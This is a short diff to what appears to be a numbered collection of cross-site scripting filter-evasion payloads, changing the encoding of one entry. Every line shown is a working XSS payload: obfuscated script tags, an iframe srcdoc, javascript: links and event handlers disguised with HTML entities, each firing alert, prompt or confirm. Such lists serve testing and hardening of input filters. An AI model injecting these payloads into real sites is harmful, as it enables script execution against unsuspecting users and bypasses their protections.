@@ -36,7 +36,7 @@
 32) <script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/
 33) <iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'>
 34) <a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>
-35) <script ~~~>alert(0%0)</script ~~~>
+35) <script ~~~>alert(0%250)</script ~~~>
 36) <style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>
 37) <///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN
 38) <img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;prompt(1)
